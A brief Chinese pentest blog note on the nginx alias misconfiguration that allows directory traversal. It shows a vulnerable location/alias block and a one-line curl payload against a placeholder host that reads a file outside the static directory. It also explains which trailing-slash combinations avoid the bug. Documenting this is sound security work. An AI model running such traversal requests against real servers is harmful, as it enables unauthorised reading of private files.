Title: nginx的目录穿越
Category: Pentest
Slug: nginx_config_path_traversle
Date: 2019-9-17


nginx在使用proxy_pass的时候，需要处理静态文件有时候会这样做:

```
 location /static {
                alias /home/uploads/static/;
        }
```

payload:

```
curl vuln.com/static../requirements.pip
```

上面如果是两个路径最后都没有带`/`或者都带`/`则该漏洞不存在。

PS: 不知道为什么两个都不带没有存在漏洞。payload是`/../requirements.pip`失败